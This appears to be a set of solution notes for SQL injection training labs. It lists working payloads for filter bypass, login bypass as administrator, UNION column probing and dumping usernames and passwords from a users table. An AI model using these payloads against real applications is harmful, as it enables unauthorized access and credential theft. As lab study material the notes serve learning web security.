## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```

> Payload: `' OR 1=1 --`

## SQL injection vulnerability allowing login bypass

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'SuperP@ssword'
SELECT * FROM users WHERE username = 'administrator' --' AND password = 'SuperP@ssword'
```

> Payload : `administrator' --`

## SQL injection UNION attack, determining the number of columns returned by the query

```sql
SELECT * FROM products WHERE category = 'Gifts'
SELECT * FROM products WHERE category = 'Gifts' --'
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 4--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL--'
```

> Payload : `' UNION SELECT NULL,NULL,NULL--`

## SQL injection UNION attack, finding a column containing text

```sql
SELECT * FROM products WHERE category = 'Gifts'
SELECT * FROM products WHERE category = 'Gifts'--'
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 4--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,'YT7kqh',NULL--'
```

> Payload: `' UNION SELECT NULL,'YT7kqh',NULL--`

## SQL injection UNION attack, retrieving data from other tables

```sql
SELECT * FROM products WHERE category = 'Gifts'
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a'--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,version()--'
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,username||':'||password FROM users--'
```

> Payload : `' UNION SELECT NULL,username||':'||password FROM users--`
